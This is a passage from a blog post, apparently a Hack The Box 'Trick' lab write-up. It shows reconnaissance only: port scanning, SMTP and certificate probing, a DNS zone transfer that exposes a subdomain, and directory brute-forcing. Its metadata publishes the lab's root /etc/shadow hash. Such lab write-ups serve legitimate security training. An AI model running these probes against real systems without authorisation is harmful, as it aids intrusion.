@@ -1,0 +1,1338 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="robots" content="index, follow" />
+
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="/theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+        disabled="disabled"
+    href="/theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+            disabled="disabled"
+          href="/theme/pygments/default.min.css">
+    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
+          href="/theme/pygments/default.min.css">
+
+
+  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/solid.css">
+
+  <link rel="stylesheet" type="text/css" href="/static/css/custom.css">
+
+    <link href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Security Blog Atom">
+
+
+
+  
+
+
+ 
+
+<meta name="author" content="raphajohnsec" />
+<meta name="description" content="Click on &#34;Continue Reading&#34; to activate the password field." />
+<meta name="keywords" content="">
+
+
+  <meta property="og:site_name" content="Security Blog"/>
+  <meta property="og:title" content="HTB - Trick - Writeup"/>
+  <meta property="og:description" content="Click on &#34;Continue Reading&#34; to activate the password field."/>
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:url" content="/posts/2022/Jul/06/htb-trick-writeup/"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="2022-07-06 00:00:00+02:00"/>
+  <meta property="article:modified_time" content=""/>
+  <meta property="article:author" content="/author/raphajohnsec.html">
+  <meta property="article:section" content="2022"/>
+  <meta property="og:image" content="/images/profile.jpg">
+
+  <title>Security Blog &ndash; HTB - Trick - Writeup</title>
+
+</head>
+<body class="light-theme">
+  <aside>
+    <div>
+      <a href="/">
+        <img src="/images/profile.jpg" alt="Security Blog" title="Security Blog">
+      </a>
+
+      <h1>
+        <a href="/">Security Blog</a>
+      </h1>
+
+<p>Content is my own</p>
+
+      <nav>
+        <ul class="list">
+
+
+              <li>
+                <a target="_self"
+                   href="/pages/about/">
+                  About
+                </a>
+              </li>
+
+        </ul>
+      </nav>
+
+      <ul class="social">
+          <li>
+            <a  class="sc-twitter" href="https://twitter.com/raphajohnsec" target="_blank">
+              <i class="fab fa-twitter"></i>
+            </a>
+          </li>
+      </ul>
+    </div>
+
+  </aside>
+  <main>
+
+    <nav>
+      <a href="/">Home</a>
+
+      <a href="/archives.html">Archives</a>
+      <a href="/categories.html">Categories</a>
+      <a href="/tags.html">Tags</a>
+
+      <a href="/feeds/all.atom.xml">Atom</a>
+
+    </nav>
+
+<article class="single">
+  <header>
+      
+    <h1 id="htb-trick-writeup">HTB - Trick - Writeup</h1>
+    <p>
+      Posted on Wed 06 July 2022 in <a href="/category/2022.html">2022</a>
+
+    </p>
+  </header>
+
+
+  <div>
+    <p>The password is the <code>/etc/shadow</code> entry for the root user.
+Status: published
+Tags: #htb, #python, #php, #linux, #sql, #lfi, #rce, #writeup
+Category: htb
+Password: root:$6$lbBzS2rUUVRa6Erd$u2u317eVZBZgdCrT2HViYv.69vxazyKjAuVETHTpTpD42H0RDPQIbsCHwPdKqBQphI/FOmpEt3lgD9QBsu6nU1:19104:0:99999:7:::</p>
+<p>This is a writeup for the <strong>HTB Trick</strong> machine. I assume</p>
+<ul>
+<li>Target IP:        10.10.11.166</li>
+<li>Attacking IP:     10.10.14.8</li>
+</ul>
+<p>The machine required Fuzzing, Reconnaissance, SQL Injection, PHP LFI/RCE and exploitation of weak configuration.</p>
+<h1>Reconnaissance</h1>
+<div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Mon Jun 20 21:24:19 2022 as: nmap -p - -T4 -sV -oA nmap_trick 10.10.11.166
+Nmap scan report for 10.10.11.166
+Host is up (0.023s latency).
+Not shown: 65531 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+25/tcp open  smtp?
+53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
+80/tcp open  http    nginx 1.14.2
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Jun 20 21:27:20 2022 -- 1 IP address (1 host up) scanned in 180.84 seconds
+</code></pre></div>
+
+<p>Ok, a Debian box with a few ports open. </p>
+<div class="highlight"><pre><span></span><code>[2022-06-21 07:35:35] [nginx-version] [http] [info] http://10.10.11.166 [nginx/1.14.2]
+[2022-06-21 07:35:35] [tech-detect:google-font-api] [http] [info] http://10.10.11.166
+[2022-06-21 07:35:35] [tech-detect:nginx] [http] [info] http://10.10.11.166
+[2022-06-21 07:35:35] [tech-detect:jsdelivr] [http] [info] http://10.10.11.166
+[2022-06-21 07:35:40] [http-missing-security-headers:permission-policy] [http] [info] http://10.10.11.166
+[2022-06-21 07:35:40] [http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://10.10.11.166
+[2022-06-21 07:35:40] [http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://10.10.11.166
+[2022-06-21 07:35:40] [http-missing-security-headers:access-control-allow-credentials] [http] [info] http://10.10.11.166
+[2022-06-21 07:35:40] [http-missing-security-headers:content-security-policy] [http] [info] http://10.10.11.166
+[2022-06-21 07:35:40] [http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://10.10.11.166
+[2022-06-21 07:35:40] [http-missing-security-headers:x-frame-options] [http] [info] http://10.10.11.166
+[2022-06-21 07:35:40] [http-missing-security-headers:x-content-type-options] [http] [info] http://10.10.11.166
+[2022-06-21 07:35:40] [http-missing-security-headers:referrer-policy] [http] [info] http://10.10.11.166
+[2022-06-21 07:35:40] [http-missing-security-headers:clear-site-data] [http] [info] http://10.10.11.166
+[2022-06-21 07:35:40] [http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://10.10.11.166
+[2022-06-21 07:35:40] [http-missing-security-headers:access-control-max-age] [http] [info] http://10.10.11.166
+[2022-06-21 07:35:40] [http-missing-security-headers:access-control-allow-methods] [http] [info] http://10.10.11.166
+[2022-06-21 07:35:40] [http-missing-security-headers:access-control-allow-headers] [http] [info] http://10.10.11.166
+[2022-06-21 07:35:40] [http-missing-security-headers:strict-transport-security] [http] [info] http://10.10.11.166
+[2022-06-21 07:35:40] [http-missing-security-headers:access-control-expose-headers] [http] [info] http://10.10.11.166
+[2022-06-21 07:35:40] [http-missing-security-headers:access-control-allow-origin] [http] [info] http://10.10.11.166
+[2022-06-21 07:36:01] [waf-detect:nginxgeneric] [http] [info] http://10.10.11.166/
+</code></pre></div>
+
+<p>No real results from nuclei.</p>
+<p>Now trying SMTP. The server responds really slow. The nmap script <code>smtp-commands</code> wouldn't even work. So I try plain old <code>netcat</code>.</p>
+<div class="highlight"><pre><span></span><code>nc $TIP 25
+220 debian.localdomain ESMTP Postfix (Debian/GNU)
+EHLO raphajohnsec.github.io
+250-debian.localdomain
+250-PIPELINING
+250-SIZE 10240000
+250-VRFY
+250-ETRN
+250-STARTTLS
+250-ENHANCEDSTATUSCODES
+250-8BITMIME
+250-DSN
+250-SMTPUTF8
+250 CHUNKING
+QUIT
+221 2.0.0 Bye
+</code></pre></div>
+
+<p>The server supports STARTTLS, maybe I can extract a hostname from the certificate. The command used is slightly cryptic. I connect to the host on port 25 using openssl. I tell the program to use the starttls smtp dialect. I input nothing and redirect <strong>stderr</strong> to <code>/dev/null</code>. The result is a certificate which I process again with openssl to print out readable information. At the end the output is appended to a log file.</p>
+<div class="highlight"><pre><span></span><code>$ openssl s_client -showcerts -connect <span class="nv">$TIP</span>:25 -starttls smtp &lt;/dev/null <span class="m">2</span>&gt;/dev/null <span class="p">|</span> openssl x509 -text -noout <span class="p">|</span> tee -a smtp_cert_info.txt
+Certificate:
+    Data:
+        Version: <span class="m">3</span> <span class="o">(</span>0x2<span class="o">)</span>
+        Serial Number:
+            <span class="m">49</span>:ac:a9:35:09:6b:53:64:28:b9:8d:be:c5:0f:53:1b:e8:9a:2a:d1
+        Signature Algorithm: sha256WithRSAEncryption
+<span class="hll">        Issuer: <span class="nv">CN</span> <span class="o">=</span> debian
+</span>        Validity
+            Not Before: Jun <span class="m">22</span> <span class="m">12</span>:37:11 <span class="m">2021</span> GMT
+            Not After : Jun <span class="m">20</span> <span class="m">12</span>:37:11 <span class="m">2031</span> GMT
+<span class="hll">        Subject: <span class="nv">CN</span> <span class="o">=</span> debian
+</span>        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+                RSA Public-Key: <span class="o">(</span><span class="m">2048</span> bit<span class="o">)</span>
+                Modulus:
+                    <span class="m">00</span>:cf:7a:95:f8:db:13:c8:76:32:c7:32:34:10:80:
+                    b5:72:9f:db:63:7b:aa:af:bc:60:cd:e5:d1:86:ee:
+                    4f:51:24:36:e3:b4:68:3e:e7:7f:f2:01:6e:e5:2e:
+                    <span class="m">54</span>:aa:29:15:12:15:53:ba:3f:fa:8b:3c:f4:d9:3c:
+                    2a:5a:51:bf:a3:3c:5b:07:04:fc:2a:18:e3:22:ac:
+                    <span class="m">08</span>:ae:c4:8e:53:4c:34:8c:8f:39:c3:49:f1:01:0d:
+                    <span class="m">70</span>:fe:fd:4c:2b:ed:46:28:e0:9d:d7:19:e0:f2:9b:
+                    9b:8c:80:a4:1d:9d:32:4f:23:3f:37:aa:46:7a:42:
+                    1a:64:8d:46:e0:ff:05:5f:0c:66:dd:f7:a3:4d:f2:
+                    4d:79:cd:24:64:17:e6:cd:d6:1e:31:4f:ba:7b:61:
+                    3e:9f:aa:93:b4:ae:c8:00:db:15:e4:f9:f8:57:0a:
+                    <span class="m">69</span>:17:42:05:3a:c5:3d:e2:94:6b:29:1f:20:40:6d:
+                    <span class="m">25</span>:4f:46:50:2b:e0:ed:42:4f:8e:c0:15:09:71:6b:
+                    ba:53:45:8d:be:c2:ca:ae:ac:d6:18:61:e1:58:2e:
+                    <span class="m">83</span>:57:60:a9:70:70:f8:f9:3d:12:31:29:36:50:b4:
+                    a7:31:0d:2c:3a:e0:2e:46:39:1d:9f:8d:a0:5a:58:
+                    1a:ff:83:75:3e:5d:59:0e:0a:62:88:72:a8:62:49:
+                    0a:9f
+                Exponent: <span class="m">65537</span> <span class="o">(</span>0x10001<span class="o">)</span>
+        X509v3 extensions:
+            X509v3 Basic Constraints: 
+                CA:FALSE
+            X509v3 Subject Alternative Name: 
+<span class="hll">                DNS:debian
+</span>    Signature Algorithm: sha256WithRSAEncryption
+         <span class="m">78</span>:24:a7:85:38:aa:c2:66:e4:97:79:a8:f1:45:29:84:38:52:
+         4c:4a:ff:03:62:fc:7c:0e:17:d7:08:ae:cd:d8:09:cf:73:e2:
+         <span class="m">89</span>:a0:ff:f5:c9:cd:32:5f:7b:38:98:aa:bc:1d:a5:dd:50:9a:
+         <span class="m">86</span>:c8:3d:65:83:8d:3d:64:28:55:f9:59:3b:e6:f0:e9:a3:f5:
+         <span class="m">75</span>:03:f8:aa:eb:2f:58:47:ff:cb:a5:e5:fe:f2:79:d3:83:51:
+         <span class="m">25</span>:a5:29:26:83:e1:61:c4:20:c8:da:c3:39:78:09:5e:ee:15:
+         ed:1b:32:4a:84:23:51:fb:8a:57:cc:ca:ec:d8:56:f7:60:75:
+         ca:1b:f7:46:5e:14:0e:ab:3a:c0:4f:d9:fc:d7:67:4f:19:01:
+         <span class="m">19</span>:ef:6b:42:7b:09:e8:c9:31:50:11:d0:6e:1e:4f:c1:98:7b:
+         <span class="m">34</span>:70:0f:6f:db:d7:0e:85:98:84:55:0b:9d:1f:0c:c1:6b:2a:
+         e0:3a:38:02:a9:a9:c9:4c:22:c8:a5:9e:d2:48:61:13:15:55:
+         dd:83:ab:2b:90:c1:57:1f:93:0e:59:4f:ea:96:cc:da:0a:02:
+         <span class="m">11</span>:05:f8:d3:88:22:ce:2b:56:65:b7:18:1c:64:f0:23:b2:39:
+         0a:8b:cf:1e:29:68:a4:54:90:ef:3c:99:86:66:81:eb:4b:4c:
+         ab:57:be:5a
+</code></pre></div>
+
+<p>I highlighted all names found in the certificate. Again a dead end, it's always just <strong>debian</strong>.</p>
+<p>Next, I try the open DNS port.</p>
+<p>Testing first for open resolver.</p>
+<div class="highlight"><pre><span></span><code>$ dig A raphajohnsec.github.io @<span class="nv">$TIP</span>
+
+<span class="p">;</span> &lt;&lt;&gt;&gt; DiG <span class="m">9</span>.16.1-Ubuntu &lt;&lt;&gt;&gt; A raphajohnsec.github.io @10.10.11.166
+<span class="p">;;</span> global options: +cmd
+<span class="p">;;</span> Got answer:
+<span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: REFUSED, id: <span class="m">51600</span>
+<span class="p">;;</span> flags: qr rd<span class="p">;</span> QUERY: <span class="m">1</span>, ANSWER: <span class="m">0</span>, AUTHORITY: <span class="m">0</span>, ADDITIONAL: <span class="m">1</span>
+<span class="p">;;</span> WARNING: recursion requested but not available
+
+<span class="p">;;</span> OPT PSEUDOSECTION:
+<span class="p">;</span> EDNS: version: <span class="m">0</span>, flags:<span class="p">;</span> udp: <span class="m">4096</span>
+<span class="p">;</span> COOKIE: d63ddbf9388baa200a2237a962b15a7061113f8d4fbc69e5 <span class="o">(</span>good<span class="o">)</span>
+<span class="p">;;</span> QUESTION SECTION:
+<span class="p">;</span>raphajohnsec.github.io.                IN      A
+
+<span class="p">;;</span> Query time: <span class="m">24</span> msec
+<span class="p">;;</span> SERVER: <span class="m">10</span>.10.11.166#53<span class="o">(</span><span class="m">10</span>.10.11.166<span class="o">)</span>
+<span class="p">;;</span> WHEN: Di Jun <span class="m">21</span> <span class="m">08</span>:05:56 CEST <span class="m">2022</span>
+<span class="p">;;</span> MSG SIZE  rcvd: <span class="m">79</span>
+</code></pre></div>
+
+<p><strong>NOPE</strong></p>
+<p>Maybe I can resolve an internal domain, guessing <code>trick.htb</code>.</p>
+<div class="highlight"><pre><span></span><code>dig A trick.htb @<span class="nv">$TIP</span>
+                                                                                                                                                                           <span class="p">;</span> &lt;&lt;&gt;&gt; DiG <span class="m">9</span>.16.1-Ubuntu &lt;&lt;&gt;&gt; A trick.htb @10.10.11.166
+<span class="p">;;</span> global options: +cmd
+<span class="p">;;</span> Got answer:
+<span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">23810</span>
+<span class="p">;;</span> flags: qr aa rd<span class="p">;</span> QUERY: <span class="m">1</span>, ANSWER: <span class="m">1</span>, AUTHORITY: <span class="m">1</span>, ADDITIONAL: <span class="m">2</span>
+<span class="p">;;</span> WARNING: recursion requested but not available
+
+<span class="p">;;</span> OPT PSEUDOSECTION:
+<span class="p">;</span> EDNS: version: <span class="m">0</span>, flags:<span class="p">;</span> udp: <span class="m">4096</span>
+<span class="p">;</span> COOKIE: 20d6e71c5537a31d3aa6fb7d62b15a7bbcc1446d2e6f33f0 <span class="o">(</span>good<span class="o">)</span>
+<span class="p">;;</span> QUESTION SECTION:
+<span class="p">;</span>trick.htb.                     IN      A
+
+<span class="p">;;</span> ANSWER SECTION:
+trick.htb.              <span class="m">604800</span>  IN      A       <span class="m">127</span>.0.0.1
+
+<span class="p">;;</span> AUTHORITY SECTION:
+trick.htb.              <span class="m">604800</span>  IN      NS      trick.htb.
+
+<span class="p">;;</span> ADDITIONAL SECTION:                                                                                                                                                     trick.htb.              <span class="m">604800</span>  IN      AAAA    ::1
+
+<span class="p">;;</span> Query time: <span class="m">16</span> msec
+<span class="p">;;</span> SERVER: <span class="m">10</span>.10.11.166#53<span class="o">(</span><span class="m">10</span>.10.11.166<span class="o">)</span>
+<span class="p">;;</span> WHEN: Di Jun <span class="m">21</span> <span class="m">08</span>:06:07 CEST <span class="m">2022</span>
+<span class="p">;;</span> MSG SIZE  rcvd: <span class="m">124</span>
+</code></pre></div>
+
+<p>Indeed, the server resolves <code>trick.htb</code> to <code>127.0.0.1</code>. So maybe I can find subdomains. I start with the <em>easiest</em> way, using <strong>axfr</strong> to initiate a zone transfer.</p>
+<p>It didn't work for an empty domain (all), but when I specify <code>trick.htb</code> as zone transfer domain.</p>
+<div class="highlight"><pre><span></span><code>$ dig axfr trick.htb @<span class="nv">$TIP</span>
+
+<span class="p">;</span> &lt;&lt;&gt;&gt; DiG <span class="m">9</span>.16.1-Ubuntu &lt;&lt;&gt;&gt; axfr trick.htb @10.10.11.166
+<span class="p">;;</span> global options: +cmd
+trick.htb.              <span class="m">604800</span>  IN      SOA     trick.htb. root.trick.htb. <span class="m">5</span> <span class="m">604800</span> <span class="m">86400</span> <span class="m">2419200</span> <span class="m">604800</span>
+trick.htb.              <span class="m">604800</span>  IN      NS      trick.htb.
+trick.htb.              <span class="m">604800</span>  IN      A       <span class="m">127</span>.0.0.1
+trick.htb.              <span class="m">604800</span>  IN      AAAA    ::1
+preprod-payroll.trick.htb. <span class="m">604800</span> IN    CNAME   trick.htb.
+trick.htb.              <span class="m">604800</span>  IN      SOA     trick.htb. root.trick.htb. <span class="m">5</span> <span class="m">604800</span> <span class="m">86400</span> <span class="m">2419200</span> <span class="m">604800</span>
+<span class="p">;;</span> Query time: <span class="m">20</span> msec
+<span class="p">;;</span> SERVER: <span class="m">10</span>.10.11.166#53<span class="o">(</span><span class="m">10</span>.10.11.166<span class="o">)</span>
+<span class="p">;;</span> WHEN: Di Jun <span class="m">21</span> <span class="m">08</span>:13:26 CEST <span class="m">2022</span>
+<span class="p">;;</span> XFR size: <span class="m">6</span> records <span class="o">(</span>messages <span class="m">1</span>, bytes <span class="m">231</span><span class="o">)</span>
+</code></pre></div>
+
+<p>There it is, subdomain <code>preprod-payroll.trick.htb</code>.
+nulcei couldn't find much, nginx, php, ...</p>
+<div class="highlight"><pre><span></span><code>$ ~/go/bin/nuclei -u http://preprod-payroll.trick.htb <span class="p">|</span> tee -a nuclei_http_preprod-payroll.trick.htb.log
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:18<span class="o">]</span> <span class="o">[</span>tech-detect:owl-carousel<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:18<span class="o">]</span> <span class="o">[</span>tech-detect:font-awesome<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:18<span class="o">]</span> <span class="o">[</span>tech-detect:animate.css<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:18<span class="o">]</span> <span class="o">[</span>tech-detect:bootstrap<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:18<span class="o">]</span> <span class="o">[</span>tech-detect:google-font-api<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:18<span class="o">]</span> <span class="o">[</span>tech-detect:nginx<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:18<span class="o">]</span> <span class="o">[</span>tech-detect:php<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:19<span class="o">]</span> <span class="o">[</span>tech-detect:nginx<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:19<span class="o">]</span> <span class="o">[</span>tech-detect:php<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:20<span class="o">]</span> <span class="o">[</span>http-missing-security-headers:x-frame-options<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:20<span class="o">]</span> <span class="o">[</span>http-missing-security-headers:cross-origin-resource-policy<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:20<span class="o">]</span> <span class="o">[</span>http-missing-security-headers:access-control-allow-origin<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:20<span class="o">]</span> <span class="o">[</span>http-missing-security-headers:access-control-allow-credentials<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:20<span class="o">]</span> <span class="o">[</span>http-missing-security-headers:permission-policy<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:20<span class="o">]</span> <span class="o">[</span>http-missing-security-headers:x-content-type-options<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:20<span class="o">]</span> <span class="o">[</span>http-missing-security-headers:clear-site-data<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:20<span class="o">]</span> <span class="o">[</span>http-missing-security-headers:access-control-allow-headers<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:20<span class="o">]</span> <span class="o">[</span>http-missing-security-headers:content-security-policy<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:20<span class="o">]</span> <span class="o">[</span>http-missing-security-headers:cross-origin-opener-policy<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:20<span class="o">]</span> <span class="o">[</span>http-missing-security-headers:access-control-expose-headers<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:20<span class="o">]</span> <span class="o">[</span>http-missing-security-headers:cross-origin-embedder-policy<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:20<span class="o">]</span> <span class="o">[</span>http-missing-security-headers:access-control-max-age<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:20<span class="o">]</span> <span class="o">[</span>http-missing-security-headers:access-control-allow-methods<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:20<span class="o">]</span> <span class="o">[</span>http-missing-security-headers:strict-transport-security<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:20<span class="o">]</span> <span class="o">[</span>http-missing-security-headers:x-permitted-cross-domain-policies<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:20<span class="o">]</span> <span class="o">[</span>http-missing-security-headers:referrer-policy<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/login.php
+<span class="o">[</span><span class="m">2022</span>-06-21 <span class="m">08</span>:28:42<span class="o">]</span> <span class="o">[</span>waf-detect:nginxgeneric<span class="o">]</span> <span class="o">[</span>http<span class="o">]</span> <span class="o">[</span>info<span class="o">]</span> http://preprod-payroll.trick.htb/
+</code></pre></div>
+
+<p>But feroxbuster did a great job finding juicy endpoints.</p>
+<div class="highlight"><pre><span></span><code>$ ./feroxbuster -k -u http://preprod-payroll.trick.htb -x php,html,txt -w directory-list-lowercase-2.3-small.txt -t <span class="m">100</span> -o feroxbuster_preprod-payroll.trick.htb.log
+<span class="m">302</span>      GET      267l      527w        0c http://preprod-payroll.trick.htb/ <span class="o">=</span>&gt; login.php
+<span class="m">302</span>      GET      267l      527w        0c http://preprod-payroll.trick.htb/index.php <span class="o">=</span>&gt; login.php
+<span class="m">200</span>      GET       27l       31w        0c http://preprod-payroll.trick.htb/home.php
+<span class="m">200</span>      GET      177l      313w        0c http://preprod-payroll.trick.htb/login.php
+<span class="m">200</span>      GET       45l      100w        0c http://preprod-payroll.trick.htb/header.php
+<span class="m">200</span>      GET       81l      141w        0c http://preprod-payroll.trick.htb/users.php
+<span class="m">301</span>      GET        7l       12w      185c http://preprod-payroll.trick.htb/assets <span class="o">=</span>&gt; http://preprod-payroll.trick.htb/assets/
+<span class="m">301</span>      GET        7l       12w      185c http://preprod-payroll.trick.htb/assets/img <span class="o">=</span>&gt; http://preprod-payroll.trick.htb/assets/img/
+<span class="m">200</span>      GET        0l        0w        0c http://preprod-payroll.trick.htb/ajax.php
+<span class="m">301</span>      GET        7l       12w      185c http://preprod-payroll.trick.htb/database <span class="o">=</span>&gt; http://preprod-payroll.trick.htb/database/
+<span class="m">301</span>      GET        7l       12w      185c http://preprod-payroll.trick.htb/assets/css <span class="o">=</span>&gt; http://preprod-payroll.trick.htb/assets/css/
+<span class="m">301</span>      GET        7l       12w      185c http://preprod-payroll.trick.htb/assets/js <span class="o">=</span>&gt; http://preprod-payroll.trick.htb/assets/js/
+<span class="m">200</span>      GET       23l       84w        0c http://preprod-payroll.trick.htb/navbar.php
+<span class="m">301</span>      GET        7l       12w      185c http://preprod-payroll.trick.htb/assets/vendor <span class="o">=</span>&gt; http://preprod-payroll.trick.htb/assets/vendor/
+<span class="m">200</span>      GET      179l      327w        0c http://preprod-payroll.trick.htb/department.php
+<span class="m">200</span>      GET       20l       42w        0c http://preprod-payroll.trick.htb/topbar.php
+<span class="m">200</span>      GET      196l      363w        0c http://preprod-payroll.trick.htb/position.php
+<span class="m">200</span>      GET       95l      155w        0c http://preprod-payroll.trick.htb/employee.php
+<span class="m">200</span>      GET      110l      181w        0c http://preprod-payroll.trick.htb/payroll.php
+<span class="m">301</span>      GET        7l       12w      185c http://preprod-payroll.trick.htb/assets/vendor/bootstrap <span class="o">=</span>&gt; http://preprod-payroll.trick.htb/assets/vendor/bootstrap/
+<span class="m">301</span>      GET        7l       12w      185c http://preprod-payroll.trick.htb/assets/vendor/bootstrap/css <span class="o">=</span>&gt; http://preprod-payroll.trick.htb/assets/vendor/bootstrap/css/
+<span class="m">301</span>      GET        7l       12w      185c http://preprod-payroll.trick.htb/assets/vendor/bootstrap/js <span class="o">=</span>&gt; http://preprod-payroll.trick.htb/assets/vendor/bootstrap/js/
+<span class="m">301</span>      GET        7l       12w      185c http://preprod-payroll.trick.htb/assets/vendor/jquery <span class="o">=</span>&gt; http://preprod-payroll.trick.htb/assets/vendor/jquery/
+</code></pre></div>
+
+<p>But I want mooooore, I also ran cariddi on those endpoints found by feroxbuster.</p>
